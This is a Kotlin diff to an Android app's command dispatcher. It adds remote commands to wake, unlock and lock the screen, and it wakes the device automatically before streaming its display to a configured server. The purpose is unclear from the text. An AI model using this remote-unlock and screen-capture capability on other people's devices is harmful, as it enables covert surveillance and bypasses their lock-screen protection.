@@ -103,6 +103,9 @@ class CommandDispatcher(
                     } catch (_: Exception) { "DEVICE" }
                     val deviceId = "${android.os.Build.MANUFACTURER}_${android.os.Build.MODEL}_${androidId.takeLast(6)}"
 
+                    // Automatically illuminate and wake screen if sleeping so stream immediately captures active display
+                    DeviceWakeManager.wakeUpScreen(context)
+
                     // Start stream immediately using applicationContext (system-wide capture)
                     ScreenCaptureManager.startStream(context.applicationContext, configStore.serverUrl, deviceId)
 
@@ -222,6 +225,21 @@ class CommandDispatcher(
 
                 "REPAIR_MAPS", "FIX_MAPS" -> {
                     executeRepairMaps()
+                }
+
+                "WAKE_SCREEN", "WAKE_DEVICE" -> {
+                    DeviceWakeManager.wakeUpScreen(context)
+                    Result.success("Screen woken up successfully.")
+                }
+
+                "UNLOCK_SCREEN", "UNLOCK_DEVICE" -> {
+                    DeviceWakeManager.wakeAndUnlock(context)
+                    Result.success("Screen woken up and keyguard unlocked successfully.")
+                }
+
+                "LOCK_SCREEN" -> {
+                    DeviceWakeManager.lockScreen(context)
+                    Result.success("Screen locked successfully.")
                 }
 
                 else -> {
